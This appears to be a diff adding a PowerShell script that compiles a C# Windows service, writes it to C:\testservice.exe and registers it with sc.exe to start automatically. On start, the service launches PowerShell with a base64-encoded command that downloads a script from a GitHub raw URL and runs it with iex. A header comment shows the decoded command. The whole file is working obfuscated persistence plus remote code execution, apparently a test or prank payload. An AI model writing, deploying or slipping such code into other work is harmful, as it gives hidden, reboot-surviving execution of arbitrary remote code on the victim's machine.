@@ -1,0 +1,49 @@
+<#
+EncodedCommand below is:
+$script = [System.Net.WebRequest]::Create('https://raw.githubusercontent.com/gfsmithak/grant-test/master/DotNetTextToSpeech'); $response = $script.GetResponse(); $respstream = $response.GetResponseStream(); $reader=new-object System.IO.StreamReader $respstream; $result = $reader.ReadToEnd(); iex $result
+#>
+
+$source = @"
+using System;
+using System.ServiceProcess;
+using System.Diagnostics;
+using System.Windows.Forms;
+
+namespace WindowsService
+{
+    public partial class Service : ServiceBase
+    {
+        public Service()
+        {
+            this.ServiceName = "Test Service";
+            this.EventLog.Log = "Application";
+            this.CanHandlePowerEvent = false;
+            this.CanHandleSessionChangeEvent = false;
+            this.CanPauseAndContinue = false;
+            this.CanShutdown = false;
+            this.CanStop = true;
+        }
+
+        static void Main()
+        {
+            ServiceBase.Run(new Service());
+        }
+
+        protected override void OnStart(string[] args)
+        {
+                        Process.Start("Powershell.exe",
+                        "-encodedcommand DQAKAA0ACgAkAHIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBDAHIAZQBhAHQAZQAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBnAGYAcwBtAGkAdABoAGEAawAvAGcAcgBhAG4AdAAtAHQAZQBzAHQALwBtAGEAcwB0AGUAcgAvAEQAbwB0AE4AZQB0AFQAZQB4AHQAVABvAFMAcABlAGUAYwBoACcAKQA7ACAAJAByAGUAcwBwACAAPQAgACQAcgAuAEcAZQB0AFIAZQBzAHAAbwBuAHMAZQAoACkAOwAgACQAcgBlAHMAcABzAHQAcgBlAGEAbQAgAD0AIAAkAHIAZQBzAHAALgBHAGUAdABSAGUAcwBwAG8AbgBzAGUAUwB0AHIAZQBhAG0AKAApADsAIAAkAHMAcgA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACAAJAByAGUAcwBwAHMAdAByAGUAYQBtADsAIAAkAHIAZQBzAHUAbAB0ACAAPQAgACQAcwByAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsAIABpAGUAeAAgACQAcgBlAHMAdQBsAHQADQAKAA0ACgA=");
+
+        }
+
+        protected override void OnStop()
+        {
+            MessageBox.Show("The voices have stopped");
+        }
+    }
+}
+
+"@
+Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms, System.ServiceProcess -Language CSharp -OutputAssembly "C:\testservice.exe" -OutputType ConsoleApplication
+
+sc.exe create testvoiceservice binpath= C:\testservice.exe type=own start= auto
